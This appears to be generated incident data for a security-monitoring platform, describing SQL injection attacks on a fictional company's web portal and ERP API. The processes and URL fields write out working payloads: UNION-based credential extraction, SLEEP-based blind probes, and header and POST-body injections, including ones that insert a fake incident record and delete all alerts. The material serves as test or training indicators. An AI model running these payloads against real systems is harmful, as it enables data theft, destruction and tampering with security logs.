note: New incidents are continuously generated in the background

alerts.title: SQL injection tool (sqlmap) execution detected on CAD01-TCORP

comments.comment: sqlmap detected probing the partner portal login endpoint. Originated from compromised engineering workstation CAD01-TCORP.

value.incidentName: APT28 - Web Application Attack on WEB01-TCORP
value.summary: APT28 gained foothold on CAD01-TCORP and used sqlmap to probe the partner portal on WEB01-TCORP for SQL injection vulnerabilities. Authentication bypass payloads were captured in web server logs.

processes: curl -s "http://192.168.20.25/api/v1/products?id=1 UNION SELECT table_name,2,3,4 FROM information_schema.tables-- -"
curl -s "http://192.168.20.25/api/v1/orders?id=1 UNION SELECT username,password,3,4 FROM users-- -"
urls: http://192.168.20.25/api/v1/products?id=1 UNION SELECT table_name,2,3,4 FROM information_schema.tables-- -
http://192.168.20.25/api/v1/products?id=1 UNION SELECT username,password,email,4 FROM users-- -

alerts.title: Web application SQL injection attack blocked - ERP01-TCORP

comments.comment: WAF blocked 47 SQLi attempts against /api/v1/products and /api/v1/orders endpoints. Payload attempts gradually escalated from error-based to UNION-based extraction.

value.incidentName: Lazarus Group - ERP REST API Data Extraction Attempt
value.summary: Lazarus Group conducted a systematic UNION-based SQL injection campaign against the ERP REST API at Øresund Industrial. The WAF captured and blocked the malicious requests; full SQL payloads are preserved as indicators of compromise.

processes: python3 -c "import requests,time; [print(time.time(), requests.get(f\"http://172.16.100.10/portal/search?q=test' AND SLEEP({n})-- -\").elapsed) for n in [0,5,0,5]]"

alerts.title: Blind SQL injection pattern detected on WEB01-TCORP partner portal

comments.comment: Anomalous response-time pattern detected on /portal/search. 5-second delays consistent with SLEEP(5) blind SQLi probes. Origin: Tor exit node 185.220.100.240.

value.incidentName: FIN7 - Blind SQL Injection Reconnaissance on Partner Portal
value.summary: FIN7 performed systematic blind time-based SQL injection reconnaissance against the Øresund Industrial partner portal. Captured HTTP requests containing SLEEP() payloads stored as indicators.

processes: curl -X POST http://172.16.100.10/portal/register -d "company_name=Acme' UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table'-- -&contact=test@test.com"

curl -X POST http://172.16.100.10/portal/register -d "company_name='); INSERT INTO incidents (incidentId,incidentName,severity,status,createdTime) VALUES ('INC-PWN','Pwned','Critical','Active','2026-01-01T00:00:00+00:00'); --&contact=x"
urls: http://172.16.100.10/portal/register [POST] company_name=Acme' UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table'-- -

alerts.title: SQL injection via POST body detected on supplier registration endpoint

comments.comment: POST body injection confirmed. Attacker enumerated table names via error messages before switching to blind extraction. company_name field was the injection point.

value.incidentName: GOLD DUPONT - Supplier Registration Form Exploitation
value.summary: GOLD DUPONT exploited the Øresund Industrial supplier registration form using POST-body SQL injection. Captured payloads show table enumeration and attempted INSERT injection.

processes: curl -H "X-Forwarded-For: 1.1.1.1' UNION SELECT username,password FROM users-- -" http://192.168.20.25/erp/dashboard
urls: http://192.168.20.25/erp/dashboard [Header: X-Forwarded-For: 1.1.1.1' UNION SELECT username,password FROM users-- -]
http://192.168.20.25/erp/dashboard [Header: X-Forwarded-For: '); DELETE FROM alerts WHERE ('1'='1]

alerts.title: HTTP header SQL injection attack detected on ERP web interface

comments.comment: Injection via X-Forwarded-For and User-Agent HTTP headers. Application was logging header values directly into the database without sanitisation.

value.incidentName: Volt Typhoon - HTTP Header Injection on ERP Web Interface
value.summary: Volt Typhoon exploited unsanitised HTTP header logging on the ERP web interface. X-Forwarded-For and User-Agent headers containing SQL payloads were written directly to the application database.

alerts.title: Brute force attack against domain controller
Brute force attack against domain controller
